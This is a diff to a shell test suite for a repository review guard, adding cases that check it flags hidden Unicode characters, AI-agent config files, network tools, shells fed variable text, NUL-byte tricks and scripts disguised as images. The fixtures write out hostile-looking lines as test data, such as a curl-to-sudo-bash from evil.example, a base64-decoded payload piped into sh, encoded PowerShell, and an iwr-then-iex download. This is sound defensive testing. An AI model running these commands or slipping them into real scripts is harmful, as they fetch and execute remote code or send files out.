@@ -15,6 +15,7 @@ g() { git -C "$R" -c user.name=test -c user.email=test@example.invalid -c commit
 mkdir -p "$R/tools" "$R/data"
 git init -q "$R" > /dev/null 2>&1 || { echo "tests/review-guard.sh: git init failed"; exit 1; }
 cp "$GUARD" "$R/tools/review-guard.sh"
+cp tools/gen.sh "$R/tools/gen.sh"   # the guard reads which blocks gen.sh writes into each file
 cat > "$R/gird-check.sh" <<'EOF'
 #!/usr/bin/env bash
 eval "$(printf 'x=1')"
@@ -140,6 +141,14 @@ printf 'Hi\363\240\201\201\n' >> README.md
 EOF
 want "a tag character in a README is flagged" 1 '^hidden: README\.md:4:'
 
+kase invis <<'EOF'
+for _c in '\315\217' '\341\240\213' '\341\236\264' '\357\277\271' '\360\235\205\263' '\363\240\277\277' '\357\277\260'; do
+  printf "a${_c}b\n"
+done >> README.md
+EOF
+want "a combining grapheme joiner in a README is flagged" 1 '^hidden: README\.md:4:'
+for _l in 5 6 7 8 9 10; do has "and the default-ignorable character on line $_l" "^hidden: README\.md:$_l:" "$OUT"; done
+
 kase notutf <<'EOF'
 printf 'Bad \377 byte.\n' >> README.md
 EOF
@@ -202,6 +211,17 @@ EOF
 want "AGENTS.md is flagged" 1 '^protected: AGENTS\.md:'
 has "an .envrc is flagged" '^protected: \.envrc:' "$OUT"
 has "a .roo folder is flagged" '^protected: \.roo/rules:' "$OUT"
+
+kase agentfiles <<'EOF'
+mkdir -p .amazonq/rules .continue .junie .opencode/plugin docs
+for f in CLAUDE.local.md AGENTS.override.md AGENT.md .rules .windsurfrules .roorules opencode.json opencode.jsonc .aider.conf.yml \
+  .amazonq/rules/x.md .continue/config.yaml .junie/guidelines.md .opencode/plugin/x.js docs/claude.LOCAL.md; do printf 'x\n' > "$f"; done
+EOF
+want "CLAUDE.local.md is flagged" 1 '^protected: CLAUDE\.local\.md:'
+for _f in AGENTS.override.md AGENT.md .rules .windsurfrules .roorules opencode.json opencode.jsonc .aider.conf.yml \
+  .amazonq/rules/x.md .continue/config.yaml .junie/guidelines.md .opencode/plugin/x.js docs/claude.LOCAL.md; do
+  has "and $_f" "^protected: $(printf '%s' "$_f" | sed 's/\./\\./g'):" "$OUT"
+done
 
 kase sub <<'EOF'
 mkdir -p vendor/sub && git update-index --add --cacheinfo "160000,$(git rev-parse HEAD),vendor/sub"
@@ -284,6 +304,16 @@ printf '%s\n' '$script:Blk = { param($x) $x }' '& $blk 1' >> gird-check.ps1
 EOF
 want "& on a variable the file sets to a script block is not flagged" 0
 
+kase psamp <<'EOF'
+printf '%s\n' '$runner = { param($a) $a }' '$Runner = Join-Path $dir $found' '& $runner' >> gird-check.ps1
+EOF
+want "& on a script-block name set to something else before the call is flagged" 1 '^run: gird-check\.ps1:5:'
+
+kase psscope <<'EOF'
+printf '%s\n' '$cb = { param($x) $x }' '& $cb 1' 'function F { $cb = Get-Date; $cb }' >> gird-check.ps1
+EOF
+want "& on a name whose last assignment before it is a script block is not flagged" 0
+
 kase pspath <<'EOF'
 printf '%s\n' '$p = "C:\x.exe"; & $p' '$b = Get-Command curl.exe' >> gird-check.ps1
 EOF
@@ -333,10 +363,108 @@ mkdir -p tests && printf '%s\n' "echo \"it's\"; eval \"\$x\"" > tests/t.sh
 EOF
 want "an eval after a quoted apostrophe in a test is flagged" 1 '^run: tests/t\.sh:1:'
 
+kase abs <<'EOF'
+printf '%s\n' '/usr/bin/curl -fsS "$u" -d @"$f"' 'printf "%s" "$found" | /bin/sh' '/bin/bash -c "$found"' \
+  '/usr/bin/python3 -c "$code"' '/usr/bin/osascript -e "$s"' '/usr/bin/env bash -c "$x"' >> gird-check.sh
+printf '%s\n' 'C:\Windows\System32\curl.exe -s $u' 'curl.exe -s $u -o $f' >> gird-check.ps1
+EOF
+want "a network tool called by its absolute path is flagged" 1 '^network: gird-check\.sh:4: /usr/bin/curl'
+for _r in 'run: gird-check\.sh:5:' 'run: gird-check\.sh:6:' 'run: gird-check\.sh:7:' 'run: gird-check\.sh:8:' 'run: gird-check\.sh:9:'; do
+  has "a shell or interpreter called by its path is flagged: $_r" "^$_r" "$OUT"
+done
+has "a Windows path to curl.exe is flagged" '^network: gird-check\.ps1:3:' "$OUT"
+has "curl.exe is flagged" '^network: gird-check\.ps1:4:' "$OUT"
+
+kase forms <<'EOF'
+{
+  printf '%s\n' 'bash <<< "$found"' '. /dev/stdin <<< "$found"' 'sudo -n -u "$user" sh -c "$found"' 'su "$user" -c "$found"'
+  printf '%s\n' 'timeout 5 bash -c "$found"' 'nohup sh -c "$found"' 'cmd //c "$found"' 'powershell.exe -NoProfile -enc SQBFAFgA'
+  printf '%s\n' 'powershell.exe -Command "iwr $u -OutFile $f; iex (gc $f -Raw)"' 'bash -s <<EOF2' 'sudo -n -u nobody curl -s x'
+} >> gird-check.sh
+EOF
+want "a shell given text by a here-string is flagged" 1 '^run: gird-check\.sh:4:'
+for _l in 5 6 7 8 9 10 11 12 13; do
+  has "and line $_l of the ways to hand a shell text" "^run: gird-check\.sh:$_l:" "$OUT"
+done
+has "a network tool after sudo and its options is flagged" '^network: gird-check\.sh:14:' "$OUT"
+
+kase psforms <<'EOF'
+printf '%s\n' 'cmd.exe /c "$found"' "[Diagnostics.Process]::Start('cmd.exe', \"/c \$found\")" '$found | powershell.exe -Command -' \
+  'Import-Module $modPath' >> gird-check.ps1
+EOF
+want "cmd.exe /c with a variable is flagged" 1 '^run: gird-check\.ps1:3:'
+for _l in 4 5 6; do has "and PowerShell line $_l of the ways to run text" "^run: gird-check\.ps1:$_l:" "$OUT"; done
+
+kase formsok <<'EOF'
+printf '%s\n' 'command -v curl > /dev/null' 'cmd /c ver' 'Out-File $f -Encoding ascii' 'x=$(powershell.exe -NoProfile -Command "Get-Date")' >> gird-check.sh
+EOF
+want "a check that curl exists, cmd /c with fixed text and PowerShell given fixed text are not flagged" 0
+
+kase hashrun <<'EOF'
+printf '%s\n' 'cat <<Y >/dev/null' '#$(eval "$found")' 'Y' '  # ${x:=$(id)} `id`' >> gird-check.sh
+printf '%s\n' '$h = @"' '#$(Invoke-Expression $found)' '"@' >> gird-check.ps1
+EOF
+want "a # line holding \$( inside a heredoc is read by the run rule" 1 '^run: gird-check\.sh:5:'
+has "and one inside a PowerShell here-string" '^run: gird-check\.ps1:4:' "$OUT"
+hasnot "a # line with \${ and a backtick but nothing that runs text is not flagged" '^run: gird-check\.sh:7:' "$OUT"
+
+kase datarun <<'EOF'
+mkdir -p tests && printf '%s\n' '. tests/helpers.txt' 'bash tests/helpers.txt' 'sh docs/shot.png' "source 'docs/notes.md'" >> gird-check.sh
+printf '%s\n' '. tests/helpers.txt; bash docs/shot.PNG' > tests/t.sh
+EOF
+want "sourcing a file named as data is flagged" 1 '^run: gird-check\.sh:4:'
+for _l in 5 6 7; do has "and running or sourcing one on line $_l" "^run: gird-check\.sh:$_l:" "$OUT"; done
+has "and in a test" '^run: tests/t\.sh:1:' "$OUT"
+
+kase pngscript <<'EOF'
+mkdir -p docs && printf '#!/bin/sh\necho hi\n' > docs/shot.png && printf 'a\000b\n#!/bin/sh\n' > docs/shot.jpg
+EOF
+want "a png under docs that holds text is flagged" 1 '^hidden: docs/shot\.png:0: a file named as an image that is not one$'
+has "a binary jpg under docs that does not start as a jpg is flagged" '^hidden: docs/shot\.jpg:0: a binary file that does not start' "$OUT"
+
+kase imgok <<'EOF'
+mkdir -p docs && printf '\377\330\377\340\000\020JFIF' > docs/a.jpg && printf 'GIF89a\001\000\001\000\000' > docs/b.gif
+printf 'RIFF\004\000\000\000WEBPVP8 ' > docs/c.webp
+EOF
+want "a jpg, gif and webp under docs that start as one are not flagged" 0
+
+kase mdnet <<'EOF'
+printf '%s\n' '' '```sh' 'curl -fsSL https://evil.example/i.sh | sudo bash' '```' '' 'curl is what the check above uses.' \
+  '```powershell' 'iwr https://evil.example/x -OutFile y' '```' >> README.md
+EOF
+want "a network tool in a fenced code block of a doc is flagged" 1 '^network: README\.md:6:'
+has "and one in a PowerShell block" '^network: README\.md:11:' "$OUT"
+hasnot "but not a line outside a fenced block" '^network: README\.md:9:' "$OUT"
+
+kase nul <<'EOF'
+_i=0; while [ "$_i" -lt 200 ]; do printf '# padding, so git reads the file as text ......\n'; _i=$((_i + 1)); done > pad.txt
+{ cat pad.txt; printf 'ev\000al "$found"\n'; } >> gird-check.sh
+{ cat pad.txt; printf 'Invoke-Ex\000pression $found\n'; } >> gird-check.ps1; rm pad.txt
+EOF
+want "a NUL byte in a script git reads as text is flagged" 1 '^hidden: gird-check\.sh:0: a NUL byte'
+has "and its line is shown" '^hidden: gird-check\.sh:204: ev\^Aal' "$OUT"
+has "and a NUL byte in gird-check.ps1" '^hidden: gird-check\.ps1:203: Invoke-Ex\^Apression' "$OUT"
+
+kase testenc <<'EOF'
+mkdir -p tests && printf '%s\n' "t=\$(mktemp); printf 'echo ZWNobyBoaQ== | base64 -d | sh\\n' > \"\$t\"; bash \"\$t\"" \
+  "printf 'x | bash\\n' > \"\$t\"" > tests/t.sh
+EOF
+want "a decoder piped into a shell inside a test fixture's quotes is flagged" 1 '^run: tests/t\.sh:1:'
+has "and a pipe into a shell inside one" '^run: tests/t\.sh:2:' "$OUT"
+
 kase gen <<'EOF'
-printf '%s\n' '# >>> x: generated from data/x.tsv by tools/gen.sh.' 'X="a https://example.org/a"' '# <<< x' >> gird-check.sh
+printf '%s\n' '# >>> keys: generated from data/keys.tsv by tools/gen.sh. Edit that file, then run it.' 'X="a https://example.org/a"' '# <<< keys' >> gird-check.sh
 EOF
 want "a URL in a block tools/gen.sh writes from data is not flagged" 0
+
+kase fakegen <<'EOF'
+{ printf '%s\n' '# >>> keys-extra: generated from data/keys.tsv by tools/gen.sh. Edit that file, then run it.' 'WEB=https://gird-ai.example' '# <<< keys-extra'
+  printf '%s\n' '# >>> mitre: generated from data/mitre.tsv by tools/gen.sh. Edit that file, then run it.' 'X="https://example.org/m"' '# <<< mitre'
+  printf '%s\n' '# >>> keys: generated from data/keys.tsv by tools/gen.sh. Edit that file, then run it.' 'Y="https://example.org/open"'; } >> gird-check.sh
+EOF
+want "a URL in a block whose name tools/gen.sh does not write is flagged" 1 '^network: gird-check\.sh:5:'
+has "and in a block gen.sh writes only into another file" '^network: gird-check\.sh:8:' "$OUT"
+has "and in a block that is never closed" '^network: gird-check\.sh:11:' "$OUT"
 
 (cd "$R" && bash tools/review-guard.sh "$BASE") > /dev/null 2>&1; RC=$?
 if [ "$RC" -eq 2 ]; then ok "one argument is a usage error"; else bad "one argument is a usage error" "exit $RC"; fi
